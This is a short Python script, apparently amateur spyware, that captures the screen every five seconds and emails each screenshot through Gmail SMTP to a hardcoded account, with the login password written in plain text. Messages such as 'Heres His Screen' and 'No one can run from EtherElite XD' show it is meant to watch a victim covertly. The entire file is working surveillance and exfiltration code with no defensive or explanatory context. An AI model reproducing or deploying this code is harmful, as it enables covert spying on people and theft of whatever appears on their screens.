import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import os
import time
email = "screenshotsallday@gmail.com"
password = "Fuck1ng%Sk1d"
def mail(to, subject, text, attach):
   import autopy
   bitmap = autopy.bitmap.capture_screen()
   bitmap.save('skid.png')
   msg = MIMEMultipart()
   msg['From'] = email
   msg['To'] = email
   msg['Subject'] = subject
   msg.attach(MIMEText(text))
   part = MIMEBase('application', 'octet-stream')
   part.set_payload(open(attach, 'rb').read())
   Encoders.encode_base64(part)
   part.add_header('Content-Disposition',
           'attachment; filename=`%s`' % os.path.basename(attach))
   msg.attach(part)
   mailServer = smtplib.SMTP('smtp.gmail.com', 587)
   mailServer.ehlo()
   mailServer.starttls() 
   mailServer.ehlo()
   mailServer.login(email, password)
   mailServer.sendmail(email,email, msg.as_string())
   mailServer.close()
def main():
      while True:
         mail('some.person@some.address.com',
         'Heres His Screen ~NSP',
         'No one can run from EtherElite XD',
         'skid.png')
         time.sleep(5)
if __name__=='__main__':
   main()
